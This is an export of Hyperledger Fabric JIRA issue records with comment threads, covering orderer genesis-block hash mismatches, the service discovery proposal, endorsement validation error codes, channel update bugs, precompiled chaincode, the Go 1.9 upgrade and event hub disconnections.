At a minimum, the orderer should log the hash of the genesis block at startup to make debugging this situation easier.",,baohua,guoger,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5542,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9kv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,guoger,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jul/17 11:53 PM;guoger;[~jyellick] Could you elaborate a bit on the case where two genesis block files are generated from same profile? They do have different hash, but the content should be the same, right? Orderers should bootstrap in the same manner as they are using same genesis block?;;;","28/Jul/17 12:10 AM;jyellick;Certainly.

The fact that things work mostly as expected is actually why this bug is especially insidious.

Each orderer starts with the same config contents, but a different initial block hash.  This means, when the orderer creates the next block, the block has the right contents, but its previous hash is incorrect, which means the current hash will also be incorrect.

All of the orderers build chains with identical transaction contents, but different hash chains.  Because everything but the hash chain is identiical, no problems arise until a peer tries to switch from one orderer to another.  At this point, it cannot find a block which will chain into its blockchain, and the system grinds to a halt.;;;","31/Jul/17 10:49 PM;guoger;Created FAB-5542 to track the work of halting orderer upon mismatch.;;;","01/Aug/17 1:20 PM;guoger;https://gerrit.hyperledger.org/r/#/c/12007/;;;","05/Oct/17 4:33 PM;baohua;Although saw this was fixed, I'm still curious about whether this patchset will help mitigate the problem really, which implicitly require that an orderer node operator check the log info manually and talk with other orderer administrators.

First, the root cause is that different orderer cannot sync info with each other. Hence they will never find they are at different chains until switching to each other (Even when the content are not the same). Hence we may need to fix from this side?

Note that this only makes sense in non-solo cases like kafka or BFT, as solo should not support multi-orderer.

I guess from current design, one possible solution is that:

1) The 1st orderer node bootstrap with the genesis block, and throw its hash value as new msg into kafka.

2) For other orderer nodes, after bootstrap with the genesis block, try checking the kafka msg, and see it the hash value matches. If there's no such hash msg, then throw themselve's.;;;","05/Oct/17 8:11 PM;guoger;[~baohua] Yes you are right, and the problem you described here is logged in FAB-5542 (linked to this jira). As simple the problem may seem to be, solution is actually not that straightforward IMO, as we are essentially dealing with a leader election scenario and we also want it replayable, even if we start pruning old kafka messages and ledger. So it's marked as improvement for now and we may address that in the future, not prioritized for now. Does this make sense?;;;","05/Oct/17 10:40 PM;baohua;[~guoger]

Glad to see there're further improvement and actions on this problem.

Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Service Discovery - peer service,FAB-5451,19464,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,25/Jul/17 6:30 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,17/May/18 8:01 PM,v1.0.0,,,v1.2.0,,fabric-gossip,,,,,,19,,,,,,,"Currently, the SDK needs to know beforehand the endpoints of the endorsers it uses in its chaincode invocation.

Additionally, it needs to know beforehand that the required chaincode has been installed on the peers.

On top of that, if the peers that the SDK interacts with fail or become unreachable - it cannot use Fabric at all.

The [following proposal|https://docs.google.com/document/d/1zP04PKay4FN0tKYjHUSanyfK9b94rtYvC9MDSKGeSSE/edit] describes a service discovery capability that if introduced to Hyperledger Fabric - would remove the above restrictions.

[~mastersingh24] [~binhn] [~muralisr]

[~jimthematrix] - This item requires collaboration with the SDK.",,alacambra-db,alexcrownus,C0rWin,ChristopherFerris,daijianw,DrVadson,fredbi,guoger,ianj_mitchell@uk.ibm.com,jufeng.yao,kenmazsyma,kletkeman,MariWade,MartinC,mnegra,nemoto,n-horiguchi,qiang0723,rickr,SimonOberzan,SjirNijssen,toddinpal,troyronda,vdods,wutongtree,yacovm,YashGanthe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6771,,,,FAB-7205,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-8779,,,,,,,,,"1|hzwsv3:",,,,Unset,,May2018 - NextGen Endorsement,,,,,,Unset,,,,,,,,,,,alacambra-db,alexcrownus,C0rWin,ChristopherFerris,daijianw,DrVadson,fredbi,guoger,ianj_mitchell@uk.ibm.com,jufeng.yao,kenmazsyma,kletkeman,MariWade,MartinC,mnegra,nemoto,n-horiguchi,qiang0723,rickr,SimonOberzan,SjirNijssen,toddinpal,troyronda,vdods,wutongtree,yacovm,YashGanthe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Jul/17 10:38 PM;kletkeman;Some thoughts:

1) Please define all terms (e.g. QSCC).

2) Please explain situations in which this new service is used. The generic ""cannot reach known endorsers or orderer"" makes sense as a start, but if an application is not fed a connection profile, then what is it fed?

3) If the discovery service is offline, is the fabric equally unreachable? Or does must the client SDK be given a full connection profile as is true today, AND be given a discovery service to fish around for other peers to which is can talk?

4) The three flows don't really make sense, since they are merely descriptions of a query with little context. How about adding sections for scenarios? E.g.:
 * Scenario: How discovery service is configured with index for organizations, channels, chaincodes
 * Scenario: How an application in ORGx can find out what it is able to access and present a list of channels or chaincodes or both to the end user, of course with monikers that are relevant in the context of the application's stated purpose
 * Scenario: How application knows about the discovery service
 * Scenario: How application asks discovery service for a list of endorsers and orderers
 * Scenario: When many small channels (two peers, one orderer) are in use for privacy purposes, is there actually a fall back? Or is the discovery service going to simply report ""that channel is off line""? I.e. in such a scenario, does the service provide useful info?

I like the thought of a discovery service in lieu of having to give the applications too much information up front. But I think it needs to be defined very clearly.;;;","01/Aug/17 4:38 PM;yacovm;Hi, thanks for the feedback.

{quote}1) Please define all terms (e.g. QSCC).{quote}
QSCC is Query system chaincode. I expanded the acronym and gave a few links.

{quote}2) Please explain situations in which this new service is used. The generic ""cannot reach known endorsers or orderer"" makes sense as a start, but if an application is not fed a connection profile, then what is it fed?{quote}
I added a section:
bq. Intended consumers of the feature: The service discovery would be a used by client SDKs in the same way it is used now (via QSCC - Query system chaincode) in order to learn about nodes (peers and orderers) in the fabric network, and the services they provide (channels, chaincodes, etc.)

{quote}3) If the discovery service is offline, is the fabric equally unreachable? Or does must the client SDK be given a full connection profile as is true today, AND be given a discovery service to fish around for other peers to which is can talk?{quote}

There isn't a discovery service in the proposal, but a service discovery capability that would be embedded into Hyperledger Fabric peers.
However, the flow would be similar to having a discovery service (as described briefly in the document):
# A client SDK is preconfigured with a bootstrap set of peer endpoints
# It can query it to obtain more peer endpoints
# It can query those peer endpoints, and so on and so forth.
It is a good question what happens when the bootstrap peers of the application aren't available - in that case I think the reasonable step would be that if the organization of the peers would want high availability, it can:
* Have more than 1 peer have the same DNS alias and then DNS queries to the peer endpoint would return a random ip from the set of peers
* Have the TLS certificates of the peers have also a subject alternative name that fits the DNS alias
Do you think it's worthwhile to put this consideration into the document? 

{quote}4) The three flows don't really make sense, since they are merely descriptions of a query with little context. How about adding sections for scenarios? E.g.:{quote}
Note that we already have the base capability of querying a peer for its local knowledge, all I am proposing here is to have a peer keep the information about other peers in its memory, and have this information propagated via gossip (that already has the capability).
;;;","11/Aug/17 2:25 AM;ChristopherFerris;This has the requisite 5 maintainers on board. Good luck!;;;","30/Aug/17 7:30 AM;rickr;[~jimthematrix] [~Clayton Sims] Is something inconsistent here with fix version v1.1 but a label Relase-planning-1.2 ?;;;","30/Aug/17 7:35 AM;yacovm;It was planned to v1.1 but re-prioritized to 1.2 at least for now;;;","01/Sep/17 10:28 PM;ianj_mitchell@uk.ibm.com;Is the intent to provide enough information to be discovered that would enable an SDK in one org to include peers from other orgs in its endorsement gathering? That's the configuration challenge we've been struggling with for the generic REST server and Composer REST server deployment.;;;","01/Sep/17 10:33 PM;yacovm;{quote}Is the intent to provide enough information to be discovered that would enable an SDK in one org to include peers from other orgs in its endorsement gathering? {quote}
This is a major bonus for having this. The idea is that a client can only ""bootstrap"" with his own organization's certificates and would be able to use other peer's certificates as well. ;;;","01/Sep/17 10:42 PM;ianj_mitchell@uk.ibm.com;Are you thinking that the format of information returned will be consistent with the connection profile in FAB-5363? ie it might just be a form/subset of the general structure established for connection profiles.;;;","01/Sep/17 10:52 PM;yacovm;I think that thing is more useful for files and less for information that is dynamically calculated, and changes over time.;;;","01/Sep/17 10:57 PM;ianj_mitchell@uk.ibm.com;As peers come and go, or orgs come and go even, how would you expect SDK instances to stay up-to-date?;;;","01/Sep/17 11:03 PM;yacovm;The SDK only needs a peer for endorsement. When it tries invoking endorsements and the peer isn't available, it can send a service discovery query to any peer that it knows (from configuration or from service discovery) and get the list of peers that are alive currently, and usable by the client.

;;;","17/May/18 7:36 PM;YashGanthe;I have read the proposal document. When a client queries a peer that it trusts, how does the peer get the information about peers of other organizations? Do all organizations need to set up an Anchor peer and get those added in the configtx.yaml? ;;;","17/May/18 7:42 PM;yacovm;yes;;;","21/May/18 12:28 PM;jufeng.yao;This is really a wonderful new feature !

but still I wonder that if we now support dynamically select endorser. the use case is this :

1, suppose org1 has 4 endorsers for channel-A, and org2 has 4 endorsers for channel-A too
2, the endorsement policy is AND('org1.peer', 'org2.peer')
now, for under *huge* requests case, can client dynamically select org1 endorsers & org2 endorsers in turn to balance the requests? that is :
#1 request : endorsed by org1.endorser1 && org2.endorser1
#2 request : endorsed by org1.endorser2 && org2.endorser2
#3 request : endorsed by org1.endorser3 && org2.endorser3
#4 request : endorsed by org1.endorser4 && org2.endorser4
#5 request:  endorsed by org1.endorser2 && org2.endorser3
........
;;;","21/May/18 4:46 PM;C0rWin;[~jufeng.yao]

{quote}
 the endorsement policy is AND('org1.peer', 'org2.peer')
{quote}

with endorsement policy as you stated and having that each org has 4 peers following response will be send back to client, i.e.:


{code}
   Layouts: [
        QuantitiesByGroup: {
          “Org1”: 1,
          “Org2”: 1,
        }
   ],
   EndorsersByGroups: {
     “Org1”: [peer0.org1, peer1.org1, peer2.org1, pee3.org1],
     “Org2”: [peer0.org2, peer1.org2, peer2.org2, peer3.org2]
   }
{code}

which basically means that there is one group to satisfy endorsement policy, where for Org1 you need to select one among the list mapped under same id 

{code}
{   EndorsersByGroups: {
     “Org1”: [peer0.org1, peer1.org1, peer2.org1, pee3.org1],
   }
{code}

and one for Org2

{code}
   EndorsersByGroups: {
     “Org2”: [peer0.org2, peer1.org2, peer2.org2, peer3.org2]
   }
{code}

so having this you can obviously balance endorsements requests, for example selecting next peer for each org at round robin or randomly.;;;","21/May/18 5:18 PM;yacovm;It's exactly as Artem said ^ , the peer gives you a descriptor which allows you to choose the peers for the endorsements according to any policy you want:
 * Based on peer properties like organization affiliation, ledger height
 * Based on prior selections, i.e for round-robin
 * Based on randomness

I expect the SDKs to provide a default policy which ""makes sense"" and is largely optimal, but also to expose to the application developer the ability to pass its own peer selection logic should he/she want.;;;","21/May/18 11:23 PM;jufeng.yao;thanks [~C0rWin], it's helpful. 

and I agree with [~yacovm] that SDK will balance by default, and also expose to the application developer these configuration.  the SDKs don't have such ability yet, right?

and one more question is :   since the client which instantiate chaincode will get the response (I guess, right?), but how do other clients from same channel groups get the layouts? do we have query function for endorsement policy? I seems can't find such API in SDK. 

by the way, it confused me that why only *one local* container per chaincode per peer, why can't we deploy multi-containers on multi-machines?

thanks;;;","21/May/18 11:53 PM;yacovm;{quote}the SDKs don't have such ability yet, right?
{quote}
They're supposed to implement discovery client side support for v1.2
{quote} 

since the client which instantiate chaincode will get the response (I guess, right?), but how do other clients from same channel groups get the layouts? do we have query function for endorsement policy? I seems can't find such API in SDK.
{quote}
The client doesn't need to know the endorsement policy. It asks the peer ""which peers should I endorse for a specific chaincode"" and the peer tells him that descriptor Artem showed you, in response

 
{quote}by the way, it confused me that why only *one local* container per chaincode per peer, why can't we deploy multi-containers on multi-machines?
{quote}
You can deploy the chaincode on kubernetes in theory. In practice I never tried

 ;;;","22/May/18 12:13 PM;jufeng.yao;[~yacovm] thanks very much !

what I really want is that : we can deploy multi-containers for a chaincode in distributed container env, such as kubernetes or docker swarm, and load balance. after investigated source code, I noticed that the cc container proactively & directly connect to peer, which will cause a problem : load balance should be done by peer endpoint, not by kubernetes or docker swarm. 

but peer doesn't have such ability yet, right?;;;","23/May/18 2:45 AM;yacovm;No, you can't load balance chaincode containers for the same chaincode. I also don't think it's a good idea - instead, what we need is the ability to have the chaincode shim (container) to have parallel processing and not sequential as now.

 

What is your use case for load balancing?;;;","23/May/18 2:35 PM;jufeng.yao;for performance case actually. one container per chaincode won't be enough under huge requests case. currently, cc container uses go-routine to parallel process all requests, but the question is : if request number is very big, one container won't be enough at all (of course, it won't be problem under low TPS). 

one cc container need to process all requests of channels relative to this cc.  if the resource required to process huge requests (suppose 1m TPS, just an example of huge requests) exceeds ability of one container or even one machine, what should we do? 2 or more containers/machines will be needed. 

what I said is not sequential, but multi-containers, each container will parallel processing requests, while multi-containers will greatly enlarge parallel processing ability.

if we need 2 or more containers/machines, load balance is needed at some place. it can be resided in peer, or maybe shim (not very clear about this).

I think about some bottle-nicks of hyperledger fabric under high TPS:
1, SDK load balance, which is discussed above, and almost done
2, BCCSP : currently can be SW or HW, while HW costs too much, so I consider if we can have another way : docker cluster for signing and verification, this can be done by a new implementation of BCCSP
3, one container per cc: we can extend to multi-containers to enlarge the parallel ability
4, block validation :  one peer need to endorse 1/n huge requests, if this stage already make peer very busy, then possibly need other resource to validate blocks (although currently validator already uses go-routine to speed up block validation, but if peer is busy enough for endorsement stage?)
;;;","23/May/18 6:35 PM;yacovm;{quote}currently, cc container uses go-routine to parallel process all requests
{quote}
It has a single goroutine... it doesn't have a goroutine pool from what I remember. That's the problem. It needs to have multiple streams and multiple goroutines (with a handler each).
{quote}but the question is : if request number is very big, one container won't be enough at all (of course, it won't be problem under low TPS).
{quote}
It only seems that way but in practice since you do at least 1 read in most chaincodes or at least 1 write, the CPU won't be the bottleneck. In a typical application, most time is spent during network IO between the container and the peer.

 

 ;;;","23/May/18 9:31 PM;jufeng.yao;thanks very much. go-routine pool is a good idea. and even most time is spent in network IO, in current design, this can't be avoided. under huge requests case, when reach to limitation of capability of container, multi-containers still can be considered, except that cc container *NEVER* be bottleneck.;;;",,,,,,,,,,,,,,,,
Service Discovery design doc,FAB-5452,19465,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,25/Jul/17 6:38 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,17/Mar/18 8:41 PM,v1.2.0,,,v1.2.0,,fabric-gossip,,,,,,0,,,,,,,https://docs.google.com/document/d/1zP04PKay4FN0tKYjHUSanyfK9b94rtYvC9MDSKGeSSE/edit,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-8779,,,,,,,,,"1|hzwsyf:",,,,,,Sprint 6 - NextGen Endorsement,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable CouchDB passwords in Fabric Samples,FAB-5453,19468,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,chris.elder,chris.elder,chris.elder,25/Jul/17 8:43 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,03/Sep/17 1:15 AM,,,,,,fabric-samples,,,,,,0,,,,,,,"CouchDB usernames and passwords can be enabled by adding additional environment variables to docker compose files.

The environment variables are added without values.   This will create peer and couchdb containers without CouchDB passwords enabled. 

Initializing the variables will create a CouchDB container with and admin username and password.  The peer will also be created with the CouchDB username in the ledger config.",,chris.elder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9l3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,chris.elder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE - All Threads not completing 4 channel measurement,FAB-5454,19469,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wsh_bob,dinotone,dinotone,25/Jul/17 9:30 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:12 PM,,,,,,fabric-quality,,,,,,0,,,,,,,For 4 channel PTE measurement  with moderate load (aggregate of 48 Invoke request rate) only 41 of 48 PTE threads get completion messages.  PTE logs will be added shortly,,dinotone,wsh_bob,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jul/17 9:58 PM;dinotone;B70724D1.perf_driver.out;https://jira.hyperledger.org/secure/attachment/11770/B70724D1.perf_driver.out","25/Jul/17 10:06 PM;dinotone;B70724D_peer1.lpara.log;https://jira.hyperledger.org/secure/attachment/11771/B70724D_peer1.lpara.log",,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy9lb:",,,,,,,,,,,,,,,,,,,,,,,dinotone,wsh_bob,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Aug/17 12:55 PM;wsh_bob;Fixed in v1performance repo after commit 6023ca9b3f2ba1071eded2a41e8e07b61db39aa8;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Endorsement validation not post ENDORSEMENT_POLICY_FAILURE,FAB-5458,19476,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,muralisr,harrisob@us.ibm.com,harrisob@us.ibm.com,26/Jul/17 2:31 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Jul/17 11:46 PM,v1.0.0,,,v1.0.1,,fabric-peer,,,,,,0,,,,,,,"Endorsement validation failure should throw ENDORSEMENT_POLICY_FAILURE, however it is now throwing INVALID_OTHER_REASON. Due to a recent change https://gerrit.hyperledger.org/r/#/c/11753/ which added some additional checks.

This is failing NodeSDK tests, stopping progress on v1.0.1
discussed with [~muralisr]",,harrisob@us.ibm.com,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9m7:",,,,,,,,,,,,,,,,,,,,,,,harrisob@us.ibm.com,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Jul/17 2:37 AM;harrisob@us.ibm.com;Tested the following change and seems to work
Made validator.go line 560 and 591 look like (added the `*`)
{code}
	case *VSCCEndorsementPolicyError:
{code};;;","26/Jul/17 7:37 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11917/2;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Channel update fails for certain conditions,FAB-5459,19477,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,jyellick,varadatibm,varadatibm,26/Jul/17 4:40 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Jul/17 3:30 PM,,,,v1.0.1,,fabric-orderer,,,,,,0,HSBN,,,,,,"Here is my observation on the issue we are seeing

Create channel with Org1MSP and Org2MSP - SUCCESS
 Submit channel update by removing Org2MSP - SUCCESS
 Submit channel update by adding Org2MSP (now the channel should have Org1MSP and Org2MSP) - this FAILS

Create channel with Org1MSP - SUCCESS
 Submit channel update by adding Org2MSP (now channel should have Org1MSP and Org2MSP) - SUCCESS
 Submit channel update by removing Org2MSP (now channel should have Org1MSP) - SUCCESS
 Submit channel update by adding Org2MSP (now the channel should have Org1MSP and Org2MSP) - this FAILS",,jyellick,varadatibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9mf:",,,,,,,,,,,,,,,,,,,,,,,jyellick,varadatibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Jul/17 4:47 AM;Clayton Sims;Tagging it with an HSBN label.

 ;;;","26/Jul/17 4:51 AM;jyellick;In review via https://gerrit.hyperledger.org/r/#/c/11921/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ability to distribute precompiled (BINARY) user chaincode,FAB-5460,19478,,Epic,Closed,FAB,Fabric,software,denyeart,,,High,Done,sudeshrshetty,sudeshrshetty,sudeshrshetty,26/Jul/17 4:47 AM,21/Jul/18 4:09 AM,28/Oct/23 3:00 AM,08/Nov/17 11:34 PM,v1.0.0,,,,,fabric-peer,fabric-sdk-go,,,,,0,chaincode,,,,,,"As noted in the comments below:

With the move to Go 1.9 as well as --FAB-6613--, it possible to do this by specifying your own chaincode.golang.runtime image in which you would include your compile plugins.  Then you can write standard chaincode which loads the plugin(s).

 

*Old Description (abandoned)*

As a fabric application developer, I want the ability to deploy user chaincode in pre-built form so that each member organizations' peers do not need to build the UCC (nor need to have the source code on the peer).

Note: the controls on allowing organizations to examine the source code or build their own images is separate from the deployment issue. i.e., each channel and member organization can still make a decision on whether to deploy the UCC without requiring the source code to be built and available to the fabric peer itself.

Currently, installing a user chaincode on a peer requires the chaincode source code to be provided in a chaincode deployment package.

This new feature introduces an option that a chaincode deployment package contains pre-compiled executable binary instead of the chaincode source code. This introduces a new BINARY chaincode type. During the chaincode instantiation, Fabric skips the chaincode compilation step and deploys the executable binary prepared by the client into a CC docker container.

Design:

[https://docs.google.com/document/d/1kTkZEEaIB6tQJTQtWzx1YH2zR1O2PwrRhIVpTSUpLiQ/edit#|https://docs.google.com/document/d/1kTkZEEaIB6tQJTQtWzx1YH2zR1O2PwrRhIVpTSUpLiQ/edit]",,daijianw,ianj_mitchell@uk.ibm.com,mastersingh24,rameshthoomu,rickr,sudeshrshetty,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2454,FAB-5688,,,FAB-5926,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,Unset,,,Precompiled User CC,,,,Unset,,,,"1|hzy9mn:",,,,Unset,Unset,,,,,,,,,,,,,,,,,,daijianw,ianj_mitchell@uk.ibm.com,mastersingh24,rameshthoomu,rickr,sudeshrshetty,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jul/17 9:06 PM;troyronda;Note: multiple architectures needs to be handled (e.g., s390 vs x86_64);;;","19/Aug/17 4:25 AM;rameshthoomu;We purge sandbox builds on every Saturday, so the existing build was deleted from sandbox.. Triggered one more build today in sandbox https://jenkins.hyperledger.org/sandbox/job/fabric-verify-behave-x86_64_1/2/consoleFull;;;","24/Aug/17 12:45 AM;sudeshrshetty;I have a suggestion which will fix this verification build and also it will not impact anyone else’s code push.

If you look at execute shell in  [https://jenkins.hyperledger.org/job/fabric-verify-behave-x86_64/configure-readonly/]

 

.

.

.

.

 
 # Build Peer and images

 

{color:#d04437}_*make peer && make docker*_{color}

docker images | grep hyperledger

cd bddtests

behave -k -D logs=force -D cache-deployment-spec

#behave -k -D cache-deployment-spec features/bootstrap.feature
 # Deactivate vitrualenv after behave test

Deactivate

.

.

.

.

 

If you replace ‘{color:#d04437}_*make peer && make docker*_{color}’ with an already existing target for running behave dependencies called {color:#205081}‘make behave-{color}deps’ which does the same job,  will fix this code push as well as it won’t impact others.;;;","27/Aug/17 12:29 AM;troyronda;Here are some thoughts on the motivations for precompiled/preprocessed chain code in a business blockchain network/consortium.

In general, I think at least two problems can arise from requiring source code distribution to consortium peers:
 (1) Lack of flexibility in the implementation language. Peers must support every desired language and possibly even language version of fabric users (so far: Go, Java, Node).This issue is mitigated by allowing support for a binary option, and additionally by supporting the popular bytecodes such as jvm, llvm, … in possible future stories.
 (2) Lack of flexibility in the model for supplying customers/participants with the consortium implementation and certification of the implementation. A consortium should be able to choose who reviews the source code as a decoupled step from distribution of the implementation. There can be sensitive information in the source code that is appropriate for certifiers/reviewers but not appropriate for others in the consortium. The multi-organization aspect of the consortium model can have the side-effect of increasing the non-technical complexity of sensitive source code distribution.;;;","06/Sep/17 12:22 AM;rickr;[~mastersingh24] [~jimthematrix]  [~Clayton Sims] FYI. Currently *no plans to support* this for V1.1 Java SDK unless someone  jumps on board to implement and provide test coverage to assure it's working.;;;","08/Nov/17 11:33 PM;mastersingh24;Rather than marking this as WON'T FIX, I'm going to mark this DONE.

While there were many debates and negative opinions on doing this from several of the maintainers, with the move to Go 1.9 as well as -FAB-6613-, it possible to do this by specifying your own chaincode.golang.runtime image in which you would include your compile plugins.  Then you can write standard chaincode which loads the plugin(s).;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade to Golang 1.9 ,FAB-5461,19479,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,26/Jul/17 5:10 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,12/Oct/17 3:01 AM,,,,v1.0.3,v1.1.1,fabric-build,,,,,,0,build-system,,,,,,"Golang 1.9 is targetted for August release.  Assuming a 1.1 at the end of Sept, we should try to upgrade to 1.9.  If there are any issues, will fallback to 1.8.x",,harsha544,JonathanLevi,kchristidis,mastersingh24,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABG-586,,,,,,,,,,,,,,FAB-2946,,,,,,FABC-83,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9mv:",,,,,,,,,,,,,,,,,,,,,,,harsha544,JonathanLevi,kchristidis,mastersingh24,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Aug/17 10:25 PM;JonathanLevi;Following up on this too. Since, Golang ""1.9"" moved from *1.9beta1* and *go1.9beta2* to *go1.9rc1* and the latest is *go1.9rc2*
|[go1.9beta1|https://godoc.org/golang.org/x/build/version/go1.9beta1]|The go1.9beta1 command runs the go command from go1.9beta1.|
|[go1.9beta2|https://godoc.org/golang.org/x/build/version/go1.9beta2]|The go1.9beta2 command runs the go command from go1.9beta2.|
|[go1.9rc1|https://godoc.org/golang.org/x/build/version/go1.9rc1]|The go1.9rc1 command runs the go command from go1.9rc1.|
|[go1.9rc2|https://godoc.org/golang.org/x/build/version/go1.9rc2]|The go1.9rc2 command runs the go command from go1.9rc2.|

Let's see how it goes.

In the meantime, we can maybe also try to upgrade to the latest stable (*go1.8.3)* and resolve a few of the issues we are already aware of there.;;;","25/Aug/17 2:12 PM;harsha544;go1.9 is now officially released [https://golang.org/dl/#stable];;;","07/Sep/17 10:58 AM;JonathanLevi;[~mastersingh24], [~kchristidis]: shall we bring this forward (from Fix Version/s *1.2* to Fix Version/s *1.1*) ?;;;","07/Sep/17 10:59 AM;kchristidis;As soon as [https://gerrit.hyperledger.org/r/c/12819/] gets merged I see no reason why not to move forward with this for 1.1.;;;","09/Sep/17 5:49 PM;mastersingh24;Given the fact we are pushing out the release (at least as far as I know), this makes sense for 1.1 now;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Heavy load on event hub might cause event stream disconnection,FAB-5464,19482,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,wlahti,shimos,shimos,26/Jul/17 9:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/May/18 8:35 PM,v1.0.0,,,v1.1.1,,fabric-peer,,,,,,3,,,,,,,"I tried concurrent invocation of a chaincode function based on the node-sdk's integration test, and the connection of the event stream is sometimes disconnected in the middle of execution.

The configuration are as follows:
  - One solo orderer
  - Two peers (two orgs, one peer for each org)
  - One sdk-node test program (based on test/integaration/invoke.js, see attached)
    -- Each invocation writes to a different key, so no conflicts occurs during the invocation.
    -- EventHub is shared by all the invocations, thus the number of event connection is just one.
